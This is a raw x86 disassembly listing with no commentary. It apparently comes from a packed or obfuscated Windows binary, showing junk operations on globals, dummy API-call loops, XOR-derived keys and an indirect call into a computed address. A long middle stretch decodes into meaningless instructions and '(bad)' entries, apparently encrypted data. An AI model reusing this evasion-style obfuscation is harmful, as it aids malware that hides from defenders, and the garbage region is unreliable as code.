  40fa68:	lea    ecx,[esi+ecx*1+0x32729a]
  40fa6f:	xor    DWORD PTR ds:0x4335af,0x4a94
  40fa79:	xor    ecx,eax
  40fa7b:	cmp    ecx,0xf89c8525
  40fa81:	jne    0x40fa2b
  40fa87:	jmp    0x410084
  40fa8c:	add    DWORD PTR ds:0x43361b,ebx
  40fa92:	add    ecx,0xffcd8d66
  40fa98:	xor    DWORD PTR ds:0x4335a3,ebx
  40fa9e:	mov    esi,ecx
  40faa0:	or     DWORD PTR ds:0x43355f,0x3fd0
  40faaa:	xor    esi,eax
  40faac:	mov    DWORD PTR ds:0x43355f,0x62c3
  40fab6:	add    esi,DWORD PTR [ebp+0x8]
  40fab9:	mov    DWORD PTR [ebp+0x8],esi
  40fabc:	or     esi,DWORD PTR ds:0x43355f
  40fac2:	mov    esi,DWORD PTR [ebp+0x8]
  40fac5:	xor    esi,ecx
  40fac7:	xor    esi,eax
  40fac9:	mov    eax,DWORD PTR [edx+0x194]
  40facf:	jmp    0x40fd9e
  40fad4:	daa    
  40fad5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fad6:	or     DWORD PTR [esi-0x5a484d63],eax
  40fadc:	scas   al,BYTE PTR es:[edi]
  40fadd:	add    al,0x3b
  40fadf:	clc    
  40fae0:	mov    ecx,0x3d12804b
  40fae5:	mov    bl,0x7c
  40fae7:	jl     0x40fa97
  40fae9:	jle    0x40fb67
  40faeb:	jl     0x40fa95
  40faed:	dec    esp
  40faee:	ret    0xb6c7
  40faf1:	ret    
  40faf2:	and    al,0xd
  40faf4:	stos   DWORD PTR es:[edi],eax
  40faf5:	fwait
  40faf6:	pop    ds
  40faf7:	mov    eax,0x1e3cb334
  40fafc:	stos   DWORD PTR es:[edi],eax
  40fafd:	into   
  40fafe:	lock ds scas al,BYTE PTR es:[edi]
  40fb01:	mov    ch,0x57
  40fb03:	test   DWORD PTR [edi],ebp
  40fb05:	and    ecx,esp
  40fb07:	sub    DWORD PTR [ebp-0x3a],ecx
  40fb0a:	pand   mm2,mm2
  40fb0d:	xchg   edi,eax
  40fb0e:	xlat   BYTE PTR ds:[ebx]
  40fb0f:	outs   dx,BYTE PTR cs:[esi]
  40fb11:	out    dx,al
  40fb12:	dec    edx
  40fb13:	call   0xc8b536cd
  40fb18:	and    edi,DWORD PTR [ebx+0x2c9d6e65]
  40fb1e:	daa    
  40fb1f:	ficomp DWORD PTR [ebx*1-0x59a822e5]
  40fb26:	jecxz  0x40fb2e
  40fb28:	out    dx,al
  40fb29:	ret    
  40fb2a:	pop    ss
  40fb2b:	add    eax,0xe90fb586
  40fb30:	pop    edi
  40fb31:	push   ebp
  40fb32:	out    dx,al
  40fb33:	cld    
  40fb34:	cmp    DWORD PTR [edi],ecx
  40fb36:	xor    eax,0x4b6e9b92
  40fb3b:	call   0x4dfa222b
  40fb40:	push   ecx
  40fb41:	jp     0x40fade
  40fb43:	pop    ss
  40fb44:	jecxz  0x40fb7b
  40fb46:	sub    al,0x49
  40fb48:	sti    
  40fb49:	outs   dx,DWORD PTR ds:[esi]
  40fb4a:	shl    DWORD PTR [esi+0x6d7fde59],1
  40fb50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb51:	(bad)  
  40fb52:	mov    bh,0xb2
  40fb54:	mov    ecx,0xecb4d6d5
  40fb59:	mov    bl,0x6f
  40fb5b:	loop   0x40fb3c
  40fb5d:	jne    0x40fb21
  40fb5f:	fst    st(3)
  40fb61:	cdq    
  40fb62:	loop   0x40fb79
  40fb64:	cwde   
  40fb65:	or     al,0xaa
  40fb67:	inc    ecx
  40fb68:	aam    0x95
  40fb6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fb6b:	jg     0x40fb20
  40fb6d:	icebp  
  40fb6e:	pop    es
  40fb6f:	ja     0x40fbda
  40fb71:	repnz cmp eax,0x10f4ee6e
  40fb77:	shr    dl,0x5c
  40fb7a:	sbb    bl,BYTE PTR [edx+eiz*1+0x14]
  40fb7e:	(bad)  
  40fb80:	xor    al,0x16
  40fb82:	jl     0x40fbd4
  40fb84:	jnp    0x40fb46
  40fb86:	scas   eax,DWORD PTR es:[edi]
  40fb87:	inc    esp
  40fb88:	retf   0x1cd5
  40fb8b:	xor    al,0x33
  40fb8d:	pop    ebp
  40fb8e:	xchg   ebp,eax
  40fb8f:	sub    dh,BYTE PTR [ecx+0x505a83c]
  40fb95:	inc    ebp
  40fb96:	not    DWORD PTR [eax+0x4d]
  40fb99:	dec    edx
  40fb9a:	jbe    0x40fbf3
  40fb9c:	mov    eax,0x217f66ed
  40fba1:	and    DWORD PTR [eax+ecx*8-0x27],esp
  40fba5:	xchg   edx,eax
  40fba6:	push   edx
  40fba7:	fmul   st,st(0)
  40fba9:	int    0x4b
  40fbab:	fsub   DWORD PTR [edi+0x2e]
  40fbae:	in     eax,0xe4
  40fbb0:	scas   eax,DWORD PTR es:[edi]
  40fbb1:	in     eax,0x25
  40fbb3:	push   esp
  40fbb4:	sub    al,0xba
  40fbb6:	data16 jge 0x40fc07
  40fbb9:	cmp    BYTE PTR [edx],0x4b
  40fbbc:	pop    eax
  40fbbd:	es ds dec edi
  40fbc0:	pop    ss
  40fbc1:	aam    0x35
  40fbc3:	test   DWORD PTR [ebp+0x35],ecx
  40fbc6:	mov    dl,0xe
  40fbc8:	retf   
  40fbc9:	mov    edx,0x2af50450
  40fbce:	retf   0x2d7
  40fbd1:	ret    
  40fbd2:	jne    0x40fba0
  40fbd4:	mov    ebx,0x38736afe
  40fbd9:	and    bl,ah
  40fbdb:	sbb    eax,DWORD PTR [ecx+edx*4]
  40fbde:	adc    DWORD PTR ds:0x85bba793,edi
  40fbe4:	jge    0x40fc26
  40fbe6:	and    bl,BYTE PTR [esi+0x56118af4]
  40fbec:	inc    edx
  40fbed:	lfs    eax,FWORD PTR [eax+0x7]
  40fbf1:	xor    eax,0x71253111
  40fbf6:	dec    ebx
  40fbf7:	adc    al,0x25
  40fbf9:	sbb    al,al
  40fbfb:	leave  
  40fbfc:	(bad)
  40fc00:	or     eax,0xa158e070
  40fc05:	dec    ebx
  40fc06:	loop   0x40fc79
  40fc08:	xchg   ebx,eax
  40fc09:	bound  ebp,QWORD PTR [bp+di-0x34]
  40fc0d:	dec    ebp
  40fc0e:	and    DWORD PTR [esi+0x31],esi
  40fc11:	jbe    0x40fc6f
  40fc13:	fwait
  40fc14:	pop    ds
  40fc15:	mov    cl,0xf9
  40fc17:	popa   
  40fc18:	sbb    bh,BYTE PTR [ebx+0x36]
  40fc1b:	es ret 
  40fc1d:	push   es
  40fc1e:	xor    edx,esi
  40fc20:	pusha  
  40fc21:	mov    WORD PTR [edi],?
  40fc23:	call   FWORD PTR [edx]
  40fc25:	enter  0x43c2,0xc4
  40fc29:	out    dx,eax
  40fc2a:	fstp   DWORD PTR [esi]
  40fc2c:	test   al,0xcd
  40fc2e:	int    0x15
  40fc30:	in     eax,0xbd
  40fc32:	fmulp  st(3),st
  40fc34:	loop   0x40fc15
  40fc36:	aam    0x44
  40fc38:	jns    0x40fc00
  40fc3a:	data16 mov WORD PTR [eax+0x9245773],?
  40fc41:	(bad)
  40fc44:	dec    ebp
  40fc45:	push   0x50
  40fc47:	push   edi
  40fc48:	test   ch,cl
  40fc4a:	jne    0x40fbe5
  40fc4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fc4d:	cld    
  40fc4e:	ficom  WORD PTR [ecx+ecx*2]
  40fc51:	add    DWORD PTR [eax+ebp*8+0x2ab0de1f],eax
  40fc58:	jmp    0x9c56:0xbc6192ba
  40fc5f:	mov    cl,0xdd
  40fc61:	outs   dx,DWORD PTR ds:[esi]
  40fc62:	push   edx
  40fc63:	dec    eax
  40fc64:	imul   edx,DWORD PTR [edi-0x5a4ff4d4],0xdc12ebb6
  40fc6e:	inc    bx
  40fc70:	outs   dx,BYTE PTR ds:[esi]
  40fc71:	xchg   bl,bl
  40fc73:	stos   DWORD PTR es:[edi],eax
  40fc74:	jo     0x40fc95
  40fc76:	ja     0x40fc38
  40fc78:	add    BYTE PTR [ebx+0x27],bl
  40fc7b:	shr    ebp,0x95
  40fc7e:	shr    DWORD PTR [edx],1
  40fc80:	loop   0x40fccb
  40fc82:	jb     0x40fc81
  40fc84:	(bad)  
  40fc85:	imul   DWORD PTR [eax-0x6e]
  40fc88:	push   esp
  40fc89:	and    eax,0x16
  40fc8c:	push   esp
  40fc8d:	fisubr WORD PTR [edx]
  40fc8f:	(bad)
  40fc92:	outs   dx,BYTE PTR ds:[esi]
  40fc93:	ins    BYTE PTR es:[edi],dx
  40fc94:	(bad)  
  40fc95:	cmp    al,0x76
  40fc97:	and    esi,esi
  40fc99:	push   cs
  40fc9a:	mov    al,ds:0x4b051603
  40fc9f:	mov    ds:0x72e3a23b,eax
  40fca4:	xchg   DWORD PTR [eax-0x2bde18de],eax
  40fcaa:	add    ah,al
  40fcac:	repnz xchg ecx,eax
  40fcae:	(bad)  
  40fcaf:	and    edx,DWORD PTR [edi]
  40fcb1:	call   0xed40:0xd18da4b5
  40fcb8:	into   
  40fcb9:	out    0x95,eax
  40fcbb:	outs   dx,DWORD PTR ds:[esi]
  40fcbc:	mov    ebx,0x5ff09655
  40fcc1:	adc    ah,dh
  40fcc3:	mov    cl,ch
  40fcc5:	cli    
  40fcc6:	push   ds
  40fcc7:	(bad)  
  40fcc8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcc9:	int    0x89
  40fccb:	pop    ebp
  40fccc:	enter  0x654b,0x4b
  40fcd0:	dec    eax
  40fcd1:	xchg   ebx,eax
  40fcd2:	(bad)  
  40fcd3:	pusha  
  40fcd4:	push   0xad99b88d
  40fcd9:	sbb    al,0xa5
  40fcdb:	outs   dx,DWORD PTR ds:[esi]
  40fcdc:	rol    eax,1
  40fcde:	cmp    DWORD PTR [esi+0xa121f12],0x1e
  40fce5:	pop    esp
  40fce6:	mov    esi,0x5ae8b298
  40fceb:	adc    DWORD PTR [edi+ebp*1],ebp
  40fcee:	mov    edx,ecx
  40fcf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fcf1:	out    dx,al
  40fcf2:	aaa    
  40fcf3:	jb     0x40fd19
  40fcf5:	dec    edx
  40fcf6:	gs jecxz 0x40fd21
  40fcf9:	fcmove st,st(4)
  40fcfb:	mov    ch,0xbf
  40fcfd:	and    bh,BYTE PTR [esi]
  40fcff:	push   ss
  40fd00:	imul   edx,ebp,0xffffffc0
  40fd03:	mov    ds:0x8a3e7551,al
  40fd08:	or     DWORD PTR [edx-0x55],0xffffffa4
  40fd0c:	stc    
  40fd0d:	fs mov ebp,0xdb97c246
  40fd13:	mov    al,ds:0x5ef3f544
  40fd18:	dec    ecx
  40fd19:	sbb    al,0x25
  40fd1b:	adc    DWORD PTR [edi+0x28197d0],esi
  40fd21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd22:	in     eax,dx
  40fd23:	pop    es
  40fd24:	mov    esp,0x4984ecbd
  40fd29:	pop    ds
  40fd2a:	(bad)  
  40fd2c:	add    BYTE PTR [edi+0x3376a26f],al
  40fd32:	(bad)  
  40fd33:	in     al,dx
  40fd34:	mov    edi,0xce474c9c
  40fd39:	ret    
  40fd3a:	jo     0x40fcf9
  40fd3c:	stc    
  40fd3d:	fcomp  QWORD PTR [ecx+0x23]
  40fd40:	hlt    
  40fd41:	sar    ecx,cl
  40fd43:	or     DWORD PTR [edx+0x1899bef0],esp
  40fd49:	loope  0x40fd03
  40fd4b:	out    dx,eax
  40fd4c:	cmp    dh,BYTE PTR [edi-0x4e]
  40fd4f:	add    BYTE PTR [edx],bl
  40fd51:	fild   QWORD PTR [ebx+0x19066ad4]
  40fd57:	add    al,0x90
  40fd59:	xchg   esp,eax
  40fd5a:	cmp    DWORD PTR [edx],edi
  40fd5c:	rcl    BYTE PTR [esi+0x15],0x50
  40fd60:	out    0x6,eax
  40fd62:	ror    DWORD PTR [esi+0x21b93a0d],0x52
  40fd69:	fsubr  DWORD PTR [esi+0x8161a50]
  40fd6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fd70:	sbb    BYTE PTR [edi],0x33
  40fd73:	pop    esp
  40fd74:	adc    esi,DWORD PTR [ebx-0x500c6493]
  40fd7a:	mov    esi,0x8f91651f
  40fd7f:	adc    bh,0x7b
  40fd82:	cmp    al,0xda
  40fd84:	(bad)  
  40fd85:	cmp    ebp,DWORD PTR [ebp-0x62cc96ac]
  40fd8b:	sbb    al,0xf1
  40fd8d:	jp     0x40fd3c
  40fd8f:	lea    edi,[esi+0x25116ae4]
  40fd95:	pop    esp
  40fd96:	ins    BYTE PTR es:[edi],dx
  40fd97:	sahf   
  40fd98:	push   esi
  40fd99:	and    dl,dh
  40fd9b:	cmp    al,0x92
  40fd9d:	(bad)  [ebx+0x5f151108]
  40fda3:	xor    eax,0x418b0043
  40fda8:	cmp    al,0x8b
  40fdaa:	inc    esp
  40fdab:	or     BYTE PTR [eax],ch
  40fdad:	add    eax,ecx
  40fdaf:	mov    DWORD PTR [ebp+0x8],esi
  40fdb2:	mov    DWORD PTR [ebp+0x10],eax
  40fdb5:	jmp    0x410084
  40fdba:	in     al,0xad
  40fdbc:	jae    0x40fd87
  40fdbe:	jge    0x40fd89
  40fdc0:	bound  edi,QWORD PTR [ebp-0x71547538]
  40fdc6:	pop    ecx
  40fdc7:	sbb    al,0x1e
  40fdc9:	int3   
  40fdca:	outs   dx,DWORD PTR ds:[esi]
  40fdcb:	mov    ebp,0x7eae7c7c
  40fdd0:	jl     0x40fe4e
  40fdd2:	call   0xe50d9936
  40fdd7:	mov    edi,0x8547f8a7
  40fddc:	(bad)  
  40fddd:	or     eax,0x96d70e73
  40fde2:	dec    edx
  40fde3:	push   ss
  40fde4:	ins    DWORD PTR es:[edi],dx
  40fde5:	mov    ah,0x6f
  40fde7:	sbb    ch,BYTE PTR [ecx]
  40fde9:	xor    DWORD PTR [esi-0x65],esp
  40fdec:	push   0x2fdf8722
  40fdf1:	pop    ss
  40fdf2:	data16 fdiv QWORD PTR [esi-0x42450cdd]
  40fdf9:	rcl    DWORD PTR [bp+si-0x44],1
  40fdfd:	pop    edi
  40fdfe:	mov    WORD PTR [ebp+0x50952701],es
  40fe04:	daa    
  40fe05:	inc    ebx
  40fe06:	inc    esp
  40fe07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe08:	sbb    dl,dh
  40fe0a:	mov    ebx,0x1eede010
  40fe0f:	pop    edi
  40fe10:	(bad)  
  40fe12:	ja     0x40fdd1
  40fe14:	mov    ds:0x2fa9ee7d,eax
  40fe19:	adc    dl,BYTE PTR cs:[ebx+0x18d922c8]
  40fe20:	inc    ebp
  40fe21:	outs   dx,DWORD PTR ds:[esi]
  40fe22:	mov    edi,0xa1f2174a
  40fe27:	inc    eax
  40fe28:	iret   
  40fe29:	cmp    ah,BYTE PTR ss:[edi+0x2f]
  40fe2d:	inc    ebp
  40fe2e:	popa   
  40fe2f:	adc    BYTE PTR [ecx+eax*2],al
  40fe32:	mov    cs,WORD PTR ds:0x37a9dd56
  40fe38:	adc    ecx,esi
  40fe3a:	or     ebx,DWORD PTR [edi-0x16]
  40fe3d:	jnp    0x40fe46
  40fe3f:	or     al,0xf3
  40fe41:	cdq    
  40fe42:	or     eax,0xfa18cf3a
  40fe47:	imul   edx,DWORD PTR [ecx+0x75f008c8],0x41
  40fe4e:	into   
  40fe4f:	add    bh,BYTE PTR [esi+0xd]
  40fe52:	cli    
  40fe53:	int    0x9a
  40fe55:	aaa    
  40fe56:	xor    ah,BYTE PTR [ebx+0x5f89e33d]
  40fe5c:	sbb    eax,0xc9c1ac79
  40fe62:	and    eax,0x7d34fd6a
  40fe67:	shl    BYTE PTR [ecx+0x23f76de4],cl
  40fe6d:	ja     0x40febc
  40fe6f:	xor    al,0xa4
  40fe71:	sti    
  40fe72:	lds    ebp,FWORD PTR [edx]
  40fe74:	nop
  40fe75:	jne    0x40fe91
  40fe77:	nop
  40fe78:	adc    al,0x29
  40fe7a:	lods   al,BYTE PTR gs:[esi]
  40fe7c:	les    ebp,FWORD PTR [ebp-0x6e9f95c2]
  40fe82:	xor    ecx,DWORD PTR [edi]
  40fe84:	mov    ebp,0xe4772520
  40fe89:	out    0xe6,eax
  40fe8b:	rcl    DWORD PTR [ebx-0x7a],0x1
  40fe8f:	pop    eax
  40fe90:	add    al,0x5a
  40fe92:	dec    esi
  40fe93:	jecxz  0x40feb4
  40fe95:	test   DWORD PTR [ebx+0x38],esp
  40fe98:	dec    esi
  40fe99:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe9a:	pusha  
  40fe9b:	fs xor eax,0x98179f4a
  40fea1:	push   es
  40fea2:	imul   esp,eax,0x4b2a6d5c
  40fea8:	out    dx,al
  40fea9:	xchg   ebp,eax
  40feaa:	lea    edx,[edx]
  40feac:	sbb    ah,BYTE PTR [esi+eiz*2]
  40feaf:	mov    cl,0xfc
  40feb1:	aaa    
  40feb2:	cmp    DWORD PTR [ebx-0x6f],esp
  40feb5:	retf   0x34e3
  40feb8:	in     eax,0xb9
  40feba:	push   0x29
  40febc:	(bad)  
  40febd:	(bad)  
  40febf:	mov    BYTE PTR [edx+0x3115f342],bh
  40fec5:	fidivr WORD PTR [ecx]
  40fec7:	xchg   esi,eax
  40fec8:	mov    ebx,0xd3f5e5e4
  40fecd:	push   ebx
  40fece:	push   eax
  40fecf:	or     bl,ah
  40fed1:	(bad)  
  40fed2:	shl    DWORD PTR ds:0x3d5d7b7e,cl
  40fed8:	mov    esi,0x3e9981a3
  40fedd:	repnz imul edi,DWORD PTR [ecx+0x582f283a],0x10aa489f
  40fee8:	sbb    edi,DWORD PTR ds:0x3efc6d3e
  40feee:	cmp    BYTE PTR [ecx-0x10436ae9],al
  40fef4:	leave  
  40fef5:	ins    BYTE PTR es:[edi],dx
  40fef6:	or     edi,esi
  40fef8:	push   ebp
  40fef9:	ins    BYTE PTR es:[edi],dx
  40fefa:	les    esi,FWORD PTR [edi-0x2e350390]
  40ff00:	adc    eax,0x9b52d8d3
  40ff05:	retf   0xf80e
  40ff08:	scas   eax,DWORD PTR es:[edi]
  40ff09:	sahf   
  40ff0a:	sbb    al,0xa
  40ff0c:	lock xchg esp,eax
  40ff0e:	cmp    eax,DWORD PTR [edx+0x22a5cc69]
  40ff14:	add    al,0x42
  40ff16:	xchg   esi,eax
  40ff17:	adc    ebx,esi
  40ff19:	test   BYTE PTR [bx+si-0x1b],ch
  40ff1d:	fwait
  40ff1e:	jbe    0x40fea3
  40ff20:	jbe    0x40ff4f
  40ff22:	fimul  WORD PTR [esi]
  40ff24:	loopne 0x40ff9c
  40ff26:	lahf   
  40ff27:	xchg   ebx,eax
  40ff28:	adc    ch,BYTE PTR [eax+ecx*8+0x5db7ce9d]
  40ff2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff30:	retf   0x2510
  40ff33:	pop    ss
  40ff34:	xchg   edi,eax
  40ff35:	and    eax,esi
  40ff37:	rol    bh,0x6f
  40ff3a:	cli    
  40ff3b:	cli    
  40ff3c:	out    0x7d,al
  40ff3e:	jle    0x40ff78
  40ff40:	iret   
  40ff41:	sar    edx,1
  40ff43:	dec    ebp
  40ff44:	xor    esp,DWORD PTR [ecx+0x605db97a]
  40ff4a:	or     BYTE PTR [edi],0x8c
  40ff4d:	das    
  40ff4e:	xchg   dh,ah
  40ff50:	xchg   esi,eax
  40ff51:	rcr    al,0xa3
  40ff54:	pop    ss
  40ff55:	add    dh,0xdd
  40ff58:	pop    DWORD PTR [edx]
  40ff5a:	bnd jae 0x40ff48
  40ff5d:	push   ebp
  40ff5e:	iret   
  40ff5f:	test   eax,0x41e51333
  40ff64:	mov    DWORD PTR [ebx],edi
  40ff66:	sbb    DWORD PTR [ebx-0x5f],eax
  40ff69:	and    BYTE PTR [ebx+0x7e25ecc2],bh
  40ff6f:	(bad)  
  40ff70:	test   BYTE PTR [eax+0x6252a777],0xde
  40ff77:	fldl2e 
  40ff79:	cwde   
  40ff7a:	adc    ebp,DWORD PTR [edi]
  40ff7c:	(bad)  
  40ff7d:	out    0x5a,al
  40ff7f:	sbb    al,0x80
  40ff81:	mov    ds:0x268635ad,eax
  40ff86:	dec    edx
  40ff87:	inc    esi
  40ff88:	adc    dh,BYTE PTR [edx-0xc]
  40ff8b:	add    BYTE PTR [ebx+ebp*1-0x70765315],ch
  40ff92:	je     0x40ffd6
  40ff94:	mul    BYTE PTR [ecx-0x23c82b11]
  40ff9a:	push   0xb4570d44
  40ff9f:	xchg   ecx,eax
  40ffa0:	loope  0x40fffe
  40ffa2:	test   BYTE PTR [ebp+0x27c000fc],cl
  40ffa8:	xchg   esi,eax
  40ffa9:	mov    ch,bh
  40ffab:	cmc    
  40ffac:	push   ebx
  40ffad:	adc    al,0xf
  40ffaf:	mov    ds,WORD PTR [ebp-0x659a015b]
  40ffb5:	xchg   DWORD PTR [eax+edx*4],edx
  40ffb8:	xchg   edx,eax
  40ffb9:	ret    0x7b55
  40ffbc:	xchg   edi,eax
  40ffbd:	(bad)  
  40ffbe:	push   cs
  40ffbf:	pop    ecx
  40ffc0:	xchg   DWORD PTR [ecx],ecx
  40ffc2:	popf   
  40ffc3:	and    BYTE PTR [esi],0x3a
  40ffc6:	and    al,0xef
  40ffc8:	pop    ds
  40ffc9:	loopne 0x40fff3
  40ffcb:	cmp    BYTE PTR [ebx+eiz*8],bl
  40ffce:	(bad)  
  40ffcf:	aam    0xe1
  40ffd1:	stos   BYTE PTR es:[edi],al
  40ffd2:	dec    edx
  40ffd3:	jmp    0x9f6d642e
  40ffd8:	add    BYTE PTR [edx],al
  40ffda:	leave  
  40ffdb:	out    dx,eax
  40ffdc:	add    dl,dh
  40ffde:	xchg   ebx,eax
  40ffdf:	jg     0x410030
  40ffe1:	xor    BYTE PTR [ebp-0x5e],dh
  40ffe4:	mov    DWORD PTR [ebx-0x16],esi
  40ffe7:	dec    ebx
  40ffe8:	cs jae 0x410056
  40ffeb:	push   es
  40ffec:	dec    eax
  40ffed:	sub    ebx,ecx
  40ffef:	jle    0x41006b
  40fff1:	dec    edi
  40fff2:	dec    esp
  40fff3:	push   eax
  40fff4:	aam    0x7f
  40fff6:	push   ecx
  40fff7:	push   ecx
  40fff8:	mov    ch,0x29
  40fffa:	imul   esi,DWORD PTR [edx+ebp*2-0xf028068],0x3f5307f0
  410005:	mov    BYTE PTR [edi-0x1b],ch
  410008:	mov    BYTE PTR [edx-0x3a125e45],bh
  41000e:	jl     0x410048
  410010:	mov    esp,0xaf4cf1bf
  410015:	inc    ecx
  410016:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410017:	cld    
  410018:	jbe    0x41006e
  41001a:	out    dx,al
  41001b:	loop   0x40ffe9
  41001d:	mov    cl,0x40
  41001f:	repz les ecx,FWORD PTR ds:0x7283b979
  410026:	add    bh,BYTE PTR [edi]
  410028:	or     ecx,ebx
  41002a:	js     0x41005b
  41002c:	jmp    0x40fff5
  41002e:	fsub   DWORD PTR [ebp-0x1be02977]
  410034:	(bad)  
  410035:	fbld   TBYTE PTR [esi-0x22]
  410038:	pop    edi
  410039:	sbb    al,0x5d
  41003b:	xor    DWORD PTR [eax-0x4e4e2387],esi
  410041:	mov    cl,0x1d
  410043:	add    al,0x38
  410045:	push   esp
  410046:	mov    bh,0x57
  410048:	in     eax,dx
  410049:	popf   
  41004a:	repnz xchg edi,eax
  41004c:	xor    ebp,DWORD PTR ds:0x6e57e5d8
  410052:	fnstcw WORD PTR [edx-0x55]
  410055:	lock or al,0x20
  410058:	push   ss
  410059:	or     al,0x45
  41005b:	popa   
  41005c:	mov    dh,0xba
  41005e:	sar    DWORD PTR [edi],0x5f
  410061:	data16 sub al,0x26
  410064:	out    0xc6,eax
  410066:	sbb    bh,BYTE PTR [ebx]
  410068:	or     DWORD PTR [eax+0x64d45b71],0x1e1f79ce
  410072:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410073:	jb     0x41000d
  410075:	inc    ecx
  410076:	push   edi
  410077:	js     0x4100c3
  410079:	and    al,0xd8
  41007b:	ins    BYTE PTR es:[edi],dx
  41007c:	fs jae 0x41008f
  41007f:	cmp    ah,ch
  410081:	test   eax,0x458be119
  410086:	adc    BYTE PTR [esi-0x7b],bl
  410089:	ror    BYTE PTR [edi],0x84
  41008c:	push   ds
  41008d:	add    BYTE PTR [eax],al
  41008f:	add    bh,bh
  410091:	xor    eax,0x413bee
  410096:	push   DWORD PTR ds:0x41399a
  41009c:	mov    eax,DWORD PTR [edx+0x194]
  4100a2:	push   DWORD PTR [eax]
  4100a4:	mov    eax,DWORD PTR [ebp+0x10]
  4100a7:	call   eax
  4100a9:	jmp    0x4100b1
  4100ae:	mov    eax,DWORD PTR [ebp+0x10]
  4100b1:	leave  
  4100b2:	ret    0xc
  4100b5:	push   ebp
  4100b6:	mov    ebp,esp
  4100b8:	sub    esp,0x30
  4100bb:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  4100c2:	and    DWORD PTR ds:0x4335df,0x0
  4100cc:	jmp    0x4100dc
  4100d1:	mov    eax,ds:0x4335df
  4100d6:	inc    eax
  4100d7:	mov    ds:0x4335df,eax
  4100dc:	cmp    DWORD PTR ds:0x4335df,0x1a
  4100e3:	jae    0x41011c
  4100e9:	cmp    DWORD PTR ds:0x4335df,0x4
  4100f0:	jne    0x4100ff
  4100f6:	push   DWORD PTR [ebp-0x20]
  4100f9:	call   DWORD PTR ds:0x4120d4
  4100ff:	cmp    DWORD PTR ds:0x4335df,0x3
  410106:	jne    0x410117
  41010c:	mov    eax,ds:0x4335df
  410111:	inc    eax
  410112:	mov    ds:0x4335df,eax
  410117:	jmp    0x4100d1
  41011c:	mov    DWORD PTR [ebp-0x18],0xf89c8534
  410123:	sbb    eax,DWORD PTR ds:0x433673
  410129:	mov    ecx,DWORD PTR [ebp-0x4]
  41012c:	push   ebx
  41012d:	mov    eax,0x7510853
  410132:	dec    ebx
  410133:	xor    ecx,eax
  410135:	or     DWORD PTR ds:0x433557,0x33e5
  41013f:	mov    ebx,0x32729a
  410144:	sbb    DWORD PTR ds:0x4335df,0x4335e3
  41014e:	add    ecx,ebx
  410150:	and    DWORD PTR ds:0x43354f,0x433547
  41015a:	mov    DWORD PTR [ebp-0x1c],ecx
  41015d:	mov    ecx,DWORD PTR [ebp+0x14]
  410160:	sub    DWORD PTR ds:0x4335e7,0x6109
  41016a:	push   esi
  41016b:	push   edi
  41016c:	sbb    DWORD PTR ds:0x433623,0x433657
  410176:	test   ecx,ecx
  410178:	je     0x410196
  41017e:	mov    DWORD PTR ds:0x433657,0x2f8
  410188:	mov    ecx,DWORD PTR [ebp+0x14]
  41018b:	mov    ecx,DWORD PTR [ecx]
  41018d:	and    edi,DWORD PTR ds:0x433597
  410193:	mov    DWORD PTR [ebp-0x1c],ecx
  410196:	add    DWORD PTR ds:0x433623,0x2cfa
  4101a0:	imul   edx,eax
  4101a3:	add    DWORD PTR ds:0x433557,edx
  4101a9:	mov    ecx,0x4573
  4101ae:	xor    edi,edi
  4101b0:	or     edi,DWORD PTR ds:0x433677
  4101b6:	mov    esi,DWORD PTR ds:0x43368b
  4101bc:	sub    edi,esi
  4101be:	xor    edi,DWORD PTR [edi+esi*1]
  4101c1:	add    edx,ecx
  4101c3:	sub    DWORD PTR ds:0x433563,0x43359b
  4101cd:	mov    esi,0x7879
  4101d2:	mov    edi,0x1556
  4101d7:	xchg   esi,ecx
  4101d9:	and    DWORD PTR ds:0x433633,0x0
  4101e3:	mov    ecx,DWORD PTR ds:0x433633
  4101e9:	inc    ecx
  4101ea:	mov    DWORD PTR ds:0x433633,ecx
  4101f0:	cmp    DWORD PTR ds:0x433633,0x29
  4101f7:	jne    0x41023f
  4101fd:	push   0x433814
  410202:	push   DWORD PTR [ebp-0x14]
  410205:	push   DWORD PTR [ebp-0xc]
  410208:	push   0x8a72
  41020d:	push   0x8052
  410212:	push   0x5318
  410217:	push   0x69ba
  41021c:	push   0x74de
  410221:	push   0x7da6
  410226:	push   DWORD PTR [ebp-0x1c]
  410229:	push   DWORD PTR [ebp-0x24]
  41022c:	push   DWORD PTR [ebp-0x18]
  41022f:	push   0x2962
  410234:	push   0x6ae2
  410239:	call   DWORD PTR ds:0x4120d8
  41023f:	cmp    DWORD PTR ds:0x433633,0x1c
  410246:	jb     0x4101e3
  41024c:	sub    edx,edi
  41024e:	adc    DWORD PTR ds:0x433663,edi
  410254:	xor    esi,esi
  410256:	and    DWORD PTR ds:0x433657,0x0
  410260:	mov    ecx,DWORD PTR ds:0x433657
  410266:	inc    ecx
  410267:	mov    DWORD PTR ds:0x433657,ecx
  41026d:	cmp    DWORD PTR ds:0x433657,0xf
  410274:	jne    0x410288
  41027a:	push   DWORD PTR [ebp-0x10]
  41027d:	push   0x178b
  410282:	call   DWORD PTR ds:0x4121c0
  410288:	cmp    DWORD PTR ds:0x433657,0xe
  41028f:	jne    0x4102a4
  410295:	xor    ecx,ecx
  410297:	xor    ecx,DWORD PTR ds:0x433657
  41029d:	inc    ecx
  41029e:	mov    DWORD PTR ds:0x433657,ecx
  4102a4:	cmp    DWORD PTR ds:0x433657,0x1b
  4102ab:	jb     0x410260
  4102b1:	inc    ecx
  4102b2:	mov    DWORD PTR [ebp-0x28],esi
  4102b5:	not    ecx
  4102b7:	mov    DWORD PTR [ebp-0x2c],esi
  4102ba:	and    DWORD PTR ds:0x433623,0x0
  4102c4:	xor    ecx,ecx
  4102c6:	xor    ecx,DWORD PTR ds:0x433623
  4102cc:	inc    ecx
